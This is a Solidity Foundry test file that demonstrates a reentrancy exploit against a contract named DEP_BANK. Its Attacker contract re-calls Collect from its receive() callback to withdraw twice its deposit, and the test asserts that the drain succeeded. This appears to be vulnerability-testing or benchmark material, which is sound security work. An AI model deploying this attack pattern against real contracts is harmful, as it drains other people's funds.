
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {

    DEP_BANK public _contractUnderTest;

    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 && attackVal < type(uint128).max);
        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    DEP_BANK public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        bank = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedVal = val;
        initialSnapshot = address(this).balance;

        bank.Collect(val);

        if (address(this).balance == initialSnapshot + 2 * val &&
            bank.balances(address(this)) == 0 &&
            attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(storedVal);
        } else {
            revert();
        }
    }

    fallback() external payable {}
}
